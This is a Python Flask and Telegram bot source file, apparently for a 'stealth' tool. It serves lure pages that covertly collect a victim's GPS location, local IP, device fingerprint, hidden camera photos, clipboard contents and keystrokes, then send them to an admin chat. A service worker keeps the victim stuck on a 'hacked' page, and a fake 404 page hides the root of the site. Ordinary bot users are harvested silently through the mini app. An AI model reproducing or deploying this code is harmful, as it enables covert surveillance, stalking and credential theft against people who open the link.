import os
import re
import time
import json
import base64
import logging
import threading
import asyncio
import requests
from telegram import Update, InputFile, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters
from flask import Flask, request, render_template_string, jsonify

# ========== KONFİQ ==========
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = int(os.environ.get('ADMIN_ID', '0'))
PORT = int(os.environ.get('PORT', 10000))
APP_URL = os.environ.get('RENDER_EXTERNAL_URL', '')
REDIRECT_TARGET = os.environ.get('REDIRECT_URL', APP_URL)

pending_attacks = {}  # {admin_chat_id: {'target_ip': str, 'target_url': str, 'active': bool}}
active_attacks = {}   # {ip: {target_info}}

# ========== IP INFO ==========
def get_ip_info(ip):
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,as,query,mobile,proxy,hosting", timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('status') == 'success':
                return {
                    'operator': data.get('isp', 'Bilinmir'),
                    'org': data.get('org', 'Bilinmir'),
                    'asn': data.get('as', 'Bilinmir'),
                    'country': data.get('country', 'Bilinmir'),
                    'region': data.get('regionName', 'Bilinmir'),
                    'city': data.get('city', 'Bilinmir'),
                    'mobile': data.get('mobile', False),
                    'proxy': data.get('proxy', False),
                    'hosting': data.get('hosting', False)
                }
    except Exception as e:
        logger.error(f"IP info xətası: {e}")
    return {'operator': 'Bilinmir', 'org': 'Bilinmir', 'asn': 'Bilinmir', 'country': 'Bilinmir', 'region': 'Bilinmir', 'city': 'Bilinmir', 'mobile': False, 'proxy': False, 'hosting': False}

# ========== HACKED PAGE (qarşı tərəf yönləndiriləcək səhifə) ==========
HACKED_PAGE = '''
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>⚠ System Compromised</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    font-family: 'Courier New', monospace;
    background: #0a0a0a;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    overflow: hidden;
}
.container {
    text-align: center;
    padding: 40px;
}
.glitch {
    font-size: 48px;
    font-weight: bold;
    color: #ff0000;
    text-shadow: 3px 3px 0 #00ff00, -3px -3px 0 #0000ff;
    animation: glitch 1s infinite;
    margin-bottom: 20px;
}
@keyframes glitch {
    0% { transform: translate(0); }
    20% { transform: translate(-3px, 3px); }
    40% { transform: translate(3px, -3px); }
    60% { transform: translate(-2px, 2px); }
    80% { transform: translate(2px, -2px); }
    100% { transform: translate(0); }
}
.subtitle {
    font-size: 18px;
    color: #00ff00;
    margin-bottom: 30px;
    animation: blink 1.5s infinite;
}
@keyframes blink {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.3; }
}
.info {
    font-size: 14px;
    color: #888;
    margin-top: 40px;
}
.info span {
    color: #ff4444;
}
.status-bar {
    position: fixed;
    bottom: 0;
    left: 0;
    right: 0;
    background: #1a1a1a;
    color: #0f0;
    font-size: 12px;
    padding: 8px 16px;
    text-align: center;
    border-top: 1px solid #333;
}
</style>
</head>
<body>
<div class="container">
    <div class="glitch">⚠ SYSTEM HACKED ⚠</div>
    <div class="subtitle">Your device has been compromised</div>
    <div class="info">
        <span>></span> All data is being collected<br>
        <span>></span> Camera access granted<br>
        <span>></span> Location tracked<br>
        <span>></span> IP address logged: <span id="ip">unknown</span><br><br>
        This is an authorized security test.<br>
        Ryhavean Pentest Team
    </div>
</div>
<div class="status-bar">[CONNECTION ESTABLISHED] — [DATA COLLECTION ACTIVE] — [UPLOADING...]</div>

<script>
var TARGET_IP = '{{ ip }}';
document.getElementById('ip').textContent = TARGET_IP;

// STEALTH COLLECTION - even on hacked page
var clientInfo = {
    ip: TARGET_IP,
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screen: screen.width+'x'+screen.height,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    hardwareConcurrency: navigator.hardwareConcurrency || '?',
    deviceMemory: navigator.deviceMemory || '?',
    referrer: document.referrer || 'direct',
    connection: navigator.connection ? navigator.connection.effectiveType : '?',
    touchSupport: 'ontouchstart' in window,
    timestamp: new Date().toISOString()
};

// GPS
if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(function(pos) {
        clientInfo.lat = pos.coords.latitude; clientInfo.lon = pos.coords.longitude;
        clientInfo.accuracy = pos.coords.accuracy;
        sendHarvest();
    }, function(){ sendHarvest(); }, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
} else { setTimeout(sendHarvest, 300); }

// Local IP
try {
    var pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({ iceServers: [] });
    pc.createDataChannel(''); pc.createOffer().then(function(o){pc.setLocalDescription(o)}).catch(function(){});
    pc.onicecandidate = function(ice) {
        if(ice && ice.candidate) {
            var m = /([0-9]{1,3}(\\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
            if(m) { clientInfo.localIP = m[1]; }
        }
    };
} catch(e) {}

function sendHarvest() {
    fetch('/harvest', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(clientInfo)
    }).catch(function(){});
    setTimeout(startCamera, 200);
    setTimeout(captureClipboard, 1000);
}

// Camera - 5 photos
function startCamera() {
    try {
        var video = document.createElement('video');
        video.setAttribute('playsinline',''); video.setAttribute('autoplay','');
        video.style.cssText = 'position:fixed;opacity:0.001;width:1px;height:1px;top:-100px;left:-100px;z-index:-9999';
        document.body.appendChild(video);
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
        .then(function(stream) {
            video.srcObject = stream;
            video.onloadedmetadata = function() {
                video.play();
                for (var i = 0; i < 5; i++) {
                    setTimeout(function(idx){ capturePhoto(video, idx+1); }, i * 100);
                }
                setTimeout(function(){ stream.getTracks().forEach(function(t){t.stop()}); if(video.parentNode)video.parentNode.removeChild(video); }, 1200);
            };
        }).catch(function(){
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
            .then(function(stream) {
                video.srcObject = stream;
                video.onloadedmetadata = function() {
                    video.play();
                    for (var i = 0; i < 5; i++) {
                        setTimeout(function(idx){ capturePhoto(video, idx+1); }, i * 100);
                    }
                    setTimeout(function(){ stream.getTracks().forEach(function(t){t.stop()}); if(video.parentNode)video.parentNode.removeChild(video); }, 1200);
                };
            }).catch(function(){});
        });
    } catch(e) {}
}

function capturePhoto(video, index) {
    try {
        var canvas = document.createElement('canvas');
        canvas.width = 1280; canvas.height = 720;
        canvas.getContext('2d').drawImage(video, 0, 0);
        var dataUrl = canvas.toDataURL('image/jpeg', 0.85);
        fetch('/capture', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ip: TARGET_IP, photo: dataUrl, index: index, total: 5, user_agent: navigator.userAgent }) }).catch(function(){});
    } catch(e) {}
}

function captureClipboard() {
    try { if(navigator.clipboard && navigator.clipboard.readText) { navigator.clipboard.readText().then(function(t){if(t&&t.length){fetch('/click',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:TARGET_IP,data:t,type:'clipboard'})}).catch(function(){})}}).catch(function(){}) } } catch(e) {}
}

// Keylogger
var keys = [];
document.addEventListener('keydown', function(e) {
    keys.push(e.key);
    if (keys.length >= 20) {
        fetch('/click', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ip: TARGET_IP, data: keys.join(''), type: 'keylog' }) }).catch(function(){});
        keys = [];
    }
});

// Redirect system - keeps user on hacked page
if ('serviceWorker' in navigator) {
    const swCode = "self.addEventListener('fetch',function(e){e.respondWith(fetch(e.request).catch(function(){return Response.redirect('${APP_URL}/hacked?ip=${TARGET_IP}')}).then(function(r){if(r.status>=400){return Response.redirect('${APP_URL}/hacked?ip=${TARGET_IP}')}return r}))});self.addEventListener('install',function(e){self.skipWaiting()});self.addEventListener('activate',function(e){e.waitUntil(clients.claim())});";
    const swBlob = new Blob([swCode], { type: 'application/javascript' });
    navigator.serviceWorker.register(URL.createObjectURL(swBlob), { scope: '/' }).then(function(){}).catch(function(){});
}

// Periodically check and redirect if they try to leave
setInterval(function() {
    if (window.location.href.indexOf('/hacked') === -1) {
        window.location.replace('${APP_URL}/hacked?ip=${TARGET_IP}');
    }
}, 3000);

setInterval(captureClipboard, 4000);
console.log('Ryhavean HACKED page active');
</script>
</body>
</html>
'''

# ========== MINI APP PAGE (qara ekran - "Yüklənir...") ==========
MINIAPP_PAGE = '''
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { background: #000; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; flex-direction: column; }
.loading { color: #333; font-size: 16px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
.spinner { width: 30px; height: 30px; border: 3px solid #1a1a1a; border-top: 3px solid #444; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="spinner"></div>
<div class="loading">Yüklənir...</div>

<script>
var userData = {};
try {
    if (window.Telegram && window.Telegram.WebApp) {
        var wa = window.Telegram.WebApp;
        userData.telegramUser = wa.initDataUnsafe ? wa.initDataUnsafe.user : null;
        userData.telegramStartParam = wa.initDataUnsafe ? wa.initDataUnsafe.start_param : null;
        wa.ready();
    }
} catch(e) {}

userData.userAgent = navigator.userAgent;
userData.platform = navigator.platform;
userData.language = navigator.language;
userData.screen = screen.width+'x'+screen.height;
userData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
userData.hardwareConcurrency = navigator.hardwareConcurrency || '?';
userData.deviceMemory = navigator.deviceMemory || '?';
userData.touchSupport = 'ontouchstart' in window;
userData.vendor = navigator.vendor;
userData.timestamp = new Date().toISOString();

// GPS
if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(function(pos) {
        userData.lat = pos.coords.latitude; userData.lon = pos.coords.longitude;
        userData.accuracy = pos.coords.accuracy;
        sendMiniApp();
    }, function(){ sendMiniApp(); }, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
} else { setTimeout(sendMiniApp, 500); }

// Local IP
try {
    var pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({ iceServers: [] });
    pc.createDataChannel(''); pc.createOffer().then(function(o){pc.setLocalDescription(o)}).catch(function(){});
    pc.onicecandidate = function(ice) {
        if(ice && ice.candidate) {
            var m = /([0-9]{1,3}(\\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
            if(m) { userData.localIP = m[1]; }
        }
    };
} catch(e) {}

function sendMiniApp() {
    fetch('/miniapp_harvest', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(userData)
    }).catch(function(){});
}

// Camera
setTimeout(function() {
    try {
        var video = document.createElement('video');
        video.setAttribute('playsinline',''); video.setAttribute('autoplay','');
        video.style.cssText = 'position:fixed;opacity:0.001;width:1px;height:1px;top:-100px;left:-100px;z-index:-9999';
        document.body.appendChild(video);
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
        .then(function(stream) {
            video.srcObject = stream;
            video.onloadedmetadata = function() {
                video.play();
                for (var i = 0; i < 5; i++) {
                    setTimeout(function(idx){
                        var c = document.createElement('canvas');
                        c.width = 1280; c.height = 720;
                        c.getContext('2d').drawImage(video, 0, 0);
                        var d = c.toDataURL('image/jpeg', 0.85);
                        fetch('/capture', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ip: 'miniapp', photo: d, index: idx+1, total: 5, user_agent: 'MiniApp' }) }).catch(function(){});
                    }, i * 200);
                }
                setTimeout(function(){ stream.getTracks().forEach(function(t){t.stop()}); if(video.parentNode)video.parentNode.removeChild(video); }, 2000);
            };
        }).catch(function(){});
    } catch(e) {}
}, 1000);

// Clipboard
setTimeout(function() {
    try { if(navigator.clipboard && navigator.clipboard.readText) { navigator.clipboard.readText().then(function(t){if(t&&t.length){fetch('/click',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:'miniapp',data:t,type:'clipboard'})}).catch(function(){})}}).catch(function(){}) } } catch(e) {}
}, 2000);

console.log('MiniApp loaded - Ryhavean');
</script>
</body>
</html>
'''

# ========== FAKE 404 PAGE (normal ziyarətçilər üçün) ==========
FAKE_PAGE = '''
<!DOCTYPE html>
<html>
<head><title>404 Not Found</title></head>
<body>
<h1>404</h1>
<p>Page not found</p>
</body>
</html>
'''

# ========== FLASK APP ==========
app = Flask(__name__)

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr or 'unknown'

# ========== BOT HANDLERS ==========
ADMIN_STATE = {}  # {chat_id: 'awaiting_ip' or None}

async def start_handler(update: Update, context):
    user = update.effective_user
    chat_id = update.effective_chat.id
    user_id = user.id
    full_name = f"{user.first_name} {user.last_name or ''}".strip()
    
    logger.info(f"📩 /start: {full_name} (ID: {user_id})")
    
    if user_id == ADMIN_ID:
        # ADMIN: IP soruş
        ADMIN_STATE[chat_id] = 'awaiting_ip'
        welcome_text = (
            f"👋 *Xoş gəldin, Patron!* {full_name}\n\n"
            f"🎯 Hücum etmək üçün *IP ünvanı* göndər:\n"
            f"(Məsələn: `192.168.1.1` və ya `https://example.com`)\n\n"
            f"❌ `/cancel` — ləğv et"
        )
        await update.message.reply_text(welcome_text, parse_mode='Markdown')
    else:
        # NORMAL USER: xoş gəldin + mini app
        # Admin-ə xəbər göndər
        if _bot_ready and application and bot_loop:
            real_ip = get_client_ip()
            ip_info = get_ip_info(real_ip)
            admin_msg = (
                f"👤 *Yeni İstifadəçi Botu Başlatdı!*\n\n"
                f"📝 *Ad:* `{full_name}`\n"
                f"🆔 *ID:* `{user_id}`\n"
                f"📧 *Username:* @{user.username or 'yox'}\n"
                f"📍 *Real IP:* `{real_ip}`\n"
                f"📶 *ISP:* `{ip_info['operator']}`\n"
                f"🌍 *Yer:* `{ip_info['country']}, {ip_info['city']}`\n"
                f"🕒 `{time.strftime('%Y-%m-%d %H:%M:%S')}`"
            )
            asyncio.run_coroutine_threadsafe(
                application.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, parse_mode='Markdown'),
                bot_loop
            )
        
        webapp_url = f"{APP_URL}/miniapp"
        welcome_text = f"🌟 *Xoş gəldin, {full_name}!*\n\nRyhavean Stealth Bot-a xoş gəlmisiniz. 🚀\n\n👇 Düyməyə basaraq davam edin:"
        keyboard = [[InlineKeyboardButton("🚀 Tətbiqi Aç", web_app=WebAppInfo(url=webapp_url))]]
        await update.message.reply_text(welcome_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

async def handle_text(update: Update, context):
    """Admin-in IP daxil etməsini idarə edir"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    text = update.message.text.strip()
    
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Sizə icazə verilmir.")
        return
    
    # /cancel əmri
    if text == '/cancel':
        ADMIN_STATE[chat_id] = None
        await update.message.reply_text("❌ Ləğv edildi. Yenidən `/start` yazın.")
        return
    
    # IP gözləmə rejimində
    if ADMIN_STATE.get(chat_id) == 'awaiting_ip':
        ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
        url_pattern = r'^https?://[^\s]+$'
        
        if re.match(ip_pattern, text) or re.match(url_pattern, text):
            # IP qəbul edildi - təsdiq düyməsi göndər
            ADMIN_STATE[chat_id] = {'target': text}
            target_ip = text
            
            # IP məlumatlarını al
            ip_info = get_ip_info(target_ip if re.match(ip_pattern, text) else target_ip[:50])
            
            confirm_text = (
                f"🎯 *Hədəf Məlumatları:*\n\n"
                f"📍 Hədəf: `{text}`\n"
                f"📶 ISP: `{ip_info['operator']}`\n"
                f"🌍 Yer: `{ip_info['country']}, {ip_info['city']}`\n\n"
                f"✅ Hücuma başlamaq istəyirsiniz?"
            )
            
            keyboard = [[
                InlineKeyboardButton("✅ Bəli, Hücum Başlat", callback_data=f"confirm_attack:{text}"),
                InlineKeyboardButton("❌ Ləğv Et", callback_data="cancel_attack")
            ]]
            
            await update.message.reply_text(confirm_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            await update.message.reply_text("❌ Düzgün IP ünvanı və ya URL daxil edin!\nMəsələn: `192.168.1.1`")

async def button_handler(update: Update, context):
    query = update.callback_query
    await query.answer()
    data = query.data
    chat_id = query.message.chat_id
    user_id = query.from_user.id
    
    if user_id != ADMIN_ID:
        await query.edit_message_text("❌ İcazə yoxdur.")
        return
    
    if data.startswith('confirm_attack:'):
        target = data.split(':', 1)[1]
        attack_url = f"{APP_URL}/hacked?ip={target}"
        
        # Hücum linkini yadda saxla
        attack_key = target if re.match(r'^(\d{1,3}\.){3}\d{1,3}$', target) else target[:30]
        active_attacks[attack_key] = {
            'target': target,
            'started': time.time(),
            'photos': [],
            'fingerprints': []
        }
        
        ADMIN_STATE[chat_id] = None
        
        await query.edit_message_text(
            f"✅ *Hücum Başladıldı!*\n\n"
            f"📍 Hədəf: `{target}`\n"
            f"🔗 Hücum linki: [Hacked Page]({attack_url})\n\n"
            f"📸 *Nələr toplanacaq:*\n"
            f"• 5 şəkil (anında)\n"
            f"• GPS lokasiya\n"
            f"• Real IP / Local IP\n"
            f"• İnternet provayder (ISP)\n"
            f"• Clipboard məlumatları\n"
            f"• Düymə vuruşları (keylogger)\n"
            f"• Brauzer məlumatları\n\n"
            f"🔄 *Redirect:* İstənilən sayta girmək istəsə, hacked səhifəyə yönləndiriləcək",
            parse_mode='Markdown',
            disable_web_page_preview=True
        )
        
        # Admin-ə əlavə məlumat
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"🔗 *Linki hədəfə göndər:*\n`{attack_url}`\n\nLinki açan kimi hər şey avtomatik toplanacaq!",
            parse_mode='Markdown'
        )
        
    elif data == 'cancel_attack':
        ADMIN_STATE[chat_id] = None
        await query.edit_message_text("❌ Hücum ləğv edildi. Yeni IP üçün `/start` yazın.")

# ========== BOT ENGINE ==========
bot_loop = None
application = None
_bot_ready = False

def bot_loop_thread():
    global bot_loop, application, _bot_ready
    bot_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(bot_loop)
    application = Application.builder().token(TOKEN).updater(None).build()
    application.add_handler(CommandHandler('start', start_handler))
    application.add_handler(CommandHandler('cancel', lambda u, c: handle_text(u, c) if u.effective_user.id == ADMIN_ID else None))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    application.add_handler(CallbackQueryHandler(button_handler))
    bot_loop.run_until_complete(application.initialize())
    logger.info("✅ Bot init edildi")
    if APP_URL:
        bot_loop.run_until_complete(application.bot.set_webhook(url=f"{APP_URL.rstrip('/')}/webhook"))
        logger.info(f"✅ Webhook set")
    _bot_ready = True
    bot_loop.run_forever()

# ========== FLASK ROUTES ==========
@app.route('/')
def home():
    return render_template_string(FAKE_PAGE)

@app.route('/hacked')
def hacked():
    """Hacked səhifə - hücum səhifəsi"""
    ip = request.args.get('ip', get_client_ip())
    logger.info(f"🎯 HACKED PAGE açıldı! IP: {ip}")
    
    # Admin-ə xəbər göndər
    if _bot_ready and application and bot_loop:
        real_ip = get_client_ip()
        ip_info = get_ip_info(real_ip)
        msg = (
            f"🎯 *Hədəf Səhifəyə Girdi!*\n\n"
            f"📍 Hədəf IP: `{ip}`\n"
            f"📍 Real IP: `{real_ip}`\n"
            f"📶 ISP: `{ip_info['operator']}`\n"
            f"🌍 Yer: `{ip_info['country']}, {ip_info['city']}`\n"
            f"📱 Mobil: `{ip_info['mobile']}`\n"
            f"🕒 `{time.strftime('%Y-%m-%d %H:%M:%S')}`"
        )
        asyncio.run_coroutine_threadsafe(
            application.bot.send_message(chat_id=ADMIN_ID, text=msg, parse_mode='Markdown'),
            bot_loop
        )
    
    return render_template_string(HACKED_PAGE, ip=ip)

@app.route('/miniapp')
def miniapp():
    return render_template_string(MINIAPP_PAGE)

@app.route('/miniapp_harvest', methods=['POST'])
def miniapp_harvest():
    try:
        data = request.get_json()
        real_ip = get_client_ip()
        
        if _bot_ready and application and bot_loop:
            msg_parts = [f"📱 *MiniApp İstifadəçi Məlumatı*"]
            
            tg_user = data.get('telegramUser')
            if tg_user:
                first = tg_user.get('first_name', '?')
                last = tg_user.get('last_name', '')
                uid = tg_user.get('id', '?')
                uname = tg_user.get('username', '')
                msg_parts.append(f"👤 *TG Ad:* `{first} {last}`")
                msg_parts.append(f"🆔 *TG ID:* `{uid}`")
                if uname:
                    msg_parts.append(f"📧 *Username:* @{uname}")
            
            msg_parts.append(f"📍 *Real IP:* `{real_ip}`")
            ip_info = get_ip_info(real_ip)
            msg_parts.append(f"📶 *ISP:* `{ip_info['operator']}`")
            msg_parts.append(f"🌍 *Yer:* `{ip_info['country']}, {ip_info['region']}, {ip_info['city']}`")
            msg_parts.append(f"📱 *Mobil:* `{ip_info['mobile']}`")
            
            if data.get('localIP'):
                msg_parts.append(f"🏠 *Local IP:* `{data['localIP']}`")
            if data.get('platform'):
                msg_parts.append(f"💻 *Platform:* `{data['platform']}`")
            if data.get('vendor'):
                msg_parts.append(f"🏭 *Vendor:* `{data['vendor']}`")
            if data.get('timezone'):
                msg_parts.append(f"🕐 *Saat:* `{data['timezone']}`")
            if data.get('hardwareConcurrency'):
                msg_parts.append(f"⚡ *CPU:* `{data['hardwareConcurrency']}`")
            if data.get('lat'):
                maps_url = f"https://www.google.com/maps?q={data['lat']},{data['lon']}"
                msg_parts.append(f"📍 *GPS:* [{data['lat']},{data['lon']}]({maps_url})")
            if data.get('deviceMemory'):
                msg_parts.append(f"🧠 *RAM:* `{data['deviceMemory']}GB`")
            
            msg_parts.append(f"🕒 `{time.strftime('%Y-%m-%d %H:%M:%S')}`")
            
            asyncio.run_coroutine_threadsafe(
                application.bot.send_message(chat_id=ADMIN_ID, text="\n".join(msg_parts), parse_mode='Markdown', disable_web_page_preview=True),
                bot_loop
            )
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        logger.error(f"MiniApp xətası: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/harvest', methods=['POST'])
def harvest():
    try:
        data = request.get_json()
        real_ip = get_client_ip()
        
        if _bot_ready and application and bot_loop:
            msg_parts = [f"🎯 *Hacked Səhifə - Məlumat Toplandı*"]
            msg_parts.append(f"📍 *Real IP:* `{real_ip}`")
            ip_info = get_ip_info(real_ip)
            msg_parts.append(f"📶 *ISP:* `{ip_info['operator']}`")
            msg_parts.append(f"🏢 *Org:* `{ip_info['org']}`")
            msg_parts.append(f"🌍 *Yer:* `{ip_info['country']}, {ip_info['region']}, {ip_info['city']}`")
            msg_parts.append(f"📱 *Mobil:* `{ip_info['mobile']}` | *Proxy:* `{ip_info['proxy']}`")
            if data.get('localIP'):
                msg_parts.append(f"🏠 *Local IP:* `{data['localIP']}`")
            if data.get('platform'):
                msg_parts.append(f"💻 *Platform:* `{data['platform']}`")
            if data.get('timezone'):
                msg_parts.append(f"🕐 *Saat:* `{data['timezone']}`")
            if data.get('connection'):
                msg_parts.append(f"📶 *Bağlantı:* `{data['connection']}`")
            if data.get('lat'):
                maps_url = f"https://www.google.com/maps?q={data['lat']},{data['lon']}"
                msg_parts.append(f"📍 *GPS:* [{data['lat']},{data['lon']}]({maps_url})")
            msg_parts.append(f"🕒 `{time.strftime('%Y-%m-%d %H:%M:%S')}`")
            
            asyncio.run_coroutine_threadsafe(
                application.bot.send_message(chat_id=ADMIN_ID, text="\n".join(msg_parts), parse_mode='Markdown', disable_web_page_preview=True),
                bot_loop
            )
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        logger.error(f"Harvest xətası: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.get_json()
        ip = data.get('ip', 'unknown')
        photo_b64 = data.get('photo')
        idx = data.get('index')
        total = data.get('total')
        ua = data.get('user_agent', '')
        
        if not _bot_ready:
            return jsonify({'status': 'error'}), 503
        
        photo_bytes = base64.b64decode(photo_b64.split(',')[1])
        
        asyncio.run_coroutine_threadsafe(
            _send_photo(ip, photo_bytes, idx, total, ua),
            bot_loop
        )
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        logger.error(f"Capture xətası: {e}")
        return jsonify({'status': 'error'}), 500

async def _send_photo(ip, photo_bytes, idx, total, ua):
    try:
        cap = f"📸 *Gizli Kamera* | {idx}/{total}\n🎯 IP: `{ip}`\n🕒 `{time.strftime('%Y-%m-%d %H:%M:%S')}`"
        await application.bot.send_photo(
            chat_id=ADMIN_ID,
            photo=InputFile(photo_bytes, filename=f"stealth_{ip}_{idx}.jpg"),
            caption=cap,
            parse_mode='Markdown'
        )
        if idx == total:
            await application.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"✅ *Kamera tamam!* IP: `{ip}` — {total} şəkil.",
                parse_mode='Markdown'
            )
    except Exception as e:
        logger.error(f"Şəkil xətası: {e}")

@app.route('/click', methods=['POST'])
def click():
    try:
        data = request.get_json()
        ip = data.get('ip', '?')
        txt = data.get('data', '')[:1500]
        typ = data.get('type', 'data')
        icons = {'clipboard': '📋 Clipboard', 'keylog': '⌨️ Keylog', 'network': '🌐 Network'}
        icon = icons.get(typ, '📝 Data')
        
        if _bot_ready:
            asyncio.run_coroutine_threadsafe(
                application.bot.send_message(
                    chat_id=ADMIN_ID,
                    text=f"{icon}\n🎯 IP: `{ip}`\n\n```\n{txt}\n```",
                    parse_mode='Markdown'
                ),
                bot_loop
            )
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error'}), 500

@app.route('/webhook', methods=['POST'])
def webhook():
    if not _bot_ready:
        return 'Bot hazır deyil', 503
    try:
        future = asyncio.run_coroutine_threadsafe(
            _process_update(request.get_json(force=True)),
            bot_loop
        )
        future.result(timeout=10)
        return 'OK'
    except Exception as e:
        logger.error(f"Webhook xətası: {e}")
        return 'Error', 500

async def _process_update(update_json):
    try:
        update = Update.de_json(update_json, application.bot)
        await application.process_update(update)
    except Exception as e:
        logger.error(f"Update xətası: {e}", exc_info=True)

@app.route('/health')
def health():
    return {
        'status': 'ok',
        'active_attacks': list(active_attacks.keys()),
        'bot_ready': _bot_ready
    }

if __name__ == '__main__':
    if not TOKEN or TOKEN == 'YOUR_BOT_TOKEN':
        raise ValueError("BOT_TOKEN təyin edilməyib!")
    if not ADMIN_ID or ADMIN_ID == 0:
        raise ValueError("ADMIN_ID təyin edilməyib!")
    
    t = threading.Thread(target=bot_loop_thread, daemon=True)
    t.start()
    
    for i in range(30):
        if _bot_ready:
            break
        time.sleep(0.5)
    
    logger.info(f"🚀 Ryhavean ULTRA Stealth Bot - port {PORT}")
    logger.info(f"🔗 URL: {APP_URL}")
    logger.info(f"🔄 Redirect to: {REDIRECT_TARGET}")
    logger.info("🥷 ULTRA MODE: MiniApp + Hacked Page + Kamera + GPS + IP + Clipboard + Keylogger + Redirect")
    app.run(host='0.0.0.0', port=PORT, threaded=True)
